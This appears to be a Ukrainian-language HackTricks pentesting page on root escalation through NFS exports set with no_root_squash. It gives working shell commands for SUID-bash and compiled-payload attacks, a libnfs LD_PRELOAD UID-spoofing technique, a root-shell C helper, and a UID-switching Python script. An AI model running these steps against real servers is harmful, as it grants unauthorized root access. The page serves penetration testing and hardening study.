# Ескалація привілеїв через неправильне налаштування NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація про Squashing

У разі використання NFS AUTH_SYS/AUTH_UNIX сервер виконує перевірку дозволів на файли на основі `uid` і `gid`, переданих у кожному RPC-запиті. Інші security flavors, наприклад Kerberos, використовують інші облікові дані, а сервер може зіставити числові облікові дані перед перевіркою дозволів.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: зіставляє кожен UID і GID з anonymous account, яка в Linux за замовчуванням має значення `nobody` (65534). `no_all_squash` є типовим значенням для запитів не від root.<sup>[[4]](#references)</sup>
- **`root_squash`**: це типове значення в Linux; воно зіставляє запити з UID/GID 0 (root) з anonymous account. Інші UID і GID не підлягають squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: вимикає root squashing, тому запити з UID/GID 0 можуть оброблятися на сервері як запити від root.<sup>[[4]](#references)</sup>

Якщо дозволений client може підключити для запису export у **`/etc/exports`**, налаштований із **`no_root_squash`**, його запити з UID/GID 0 можуть записувати туди від імені root-користувача сервера.<sup>[[4]](#references)</sup>

Докладніше про **NFS** дивіться:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Ескалація привілеїв

### Remote Exploit

Варіант 1 із використанням bash:
- На дозволеному client підключіть export для запису від імені root, скопіюйте **`/bin/bash`** у нього, встановіть його **SUID** bit і виконайте його з victim mount, у якому не використовується `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Щоб uploaded file залишився власністю root, сервер має використовувати **`no_root_squash`**. Якщо root підлягає squash, SUID binary для іншого account можливий лише тоді, коли client може легітимно створити його або володіти ним із numeric UID/GID цього account.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 за допомогою скомпільованого C-коду:
- Змонтувати директорію з дозволеного клієнта, скопіювати скомпільований payload, який зловживає дозволами SUID, встановити його біт **SUID** і виконати його з victim (див. деякі [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Ті самі обмеження, що й раніше
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Локальний Exploit

> [!TIP]
> Зверніть увагу: якщо ви можете створити **тунель зі своєї машини до машини жертви, ви все одно можете використати Remote-версію для експлуатації цього підвищення привілеїв, прокинувши необхідні порти**.\
> Наведений нижче трюк корисний, коли `/etc/exports` обмежує export IP-адресою жертви: віддалений клієнт не може його змонтувати, але локальна техніка може працювати через share, уже змонтований на дозволеному хості.<sup>[[2]](#references)</sup>\
> Для цього unprivileged методу libnfs export у **`/etc/exports`** має використовувати прапорець `insecure`, щоб процес міг використовувати незарезервований source port; `secure` є значенням за замовчуванням, хоча процесу, здатному прив’язати зарезервований порт, ця опція не потрібна.<sup>[[1]](#references)[[4]](#references)</sup>

### Основна інформація

Клієнт NFSv3 AUTH_UNIX додає свій effective UID, GID і групи до кожного виклику, а сервер використовує їх для перевірки permissions. Ця локальна техніка зловживає цією моделлю, підробляючи RPC credentials через [libnfs](https://github.com/sahlberg/libnfs); його preload-модуль підтримує перевизначення UID/GID у контексті NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Компіляція бібліотеки

Приклад libnfs може потребувати адаптації для цільового kernel; у наведеному walkthrough окремо зазначено, що перед компіляцією preload-модуля потрібно закоментувати syscalls fallocate.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Проведення Exploit

У прикладі створюється невеликий C helper, який запускає shell, потім розміщується на share і використовується `ld_nfs.so` з UID 0 у контексті NFS, щоб зробити його SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Скомпілюйте код exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Розмістіть exploit на share та змініть його permissions, підробивши UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Виконайте exploit, щоб отримати root privileges**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Бонус: NFShell для прихованого доступу до файлів

Після отримання доступу root цей шаблон `nfsh.py` встановлює effective UID на UID цільового файлу перед запуском команди, забезпечуючи доступ без рекурсивної зміни власника.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Запустіть так:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Історія про менш відомий NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: специфікація протоколу NFS версії 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
